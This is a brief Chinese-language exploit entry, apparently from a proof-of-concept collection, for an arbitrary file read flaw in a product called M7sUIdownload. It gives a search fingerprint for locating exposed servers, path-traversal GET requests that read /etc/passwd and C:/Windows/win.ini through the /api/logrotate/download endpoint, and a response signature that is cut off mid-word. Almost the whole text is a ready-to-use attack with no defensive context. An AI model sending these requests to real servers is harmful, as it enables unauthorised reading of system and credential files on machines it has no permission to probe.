# M7sUIdownload存在任意文件读取漏洞

M7sUIdownload ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="static/js/chunk-libs.9540f991.js"`
- **请求**：`GET /api/logrotate/download?file=../../../../../../../../../../../etc/passwd HTTP/1.1`

**Payload**
```
GET /api/logrotate/download?file=../C://Windows/win.ini HTTP/1.1
```
- **响应特征**：200 Linux：
WIndow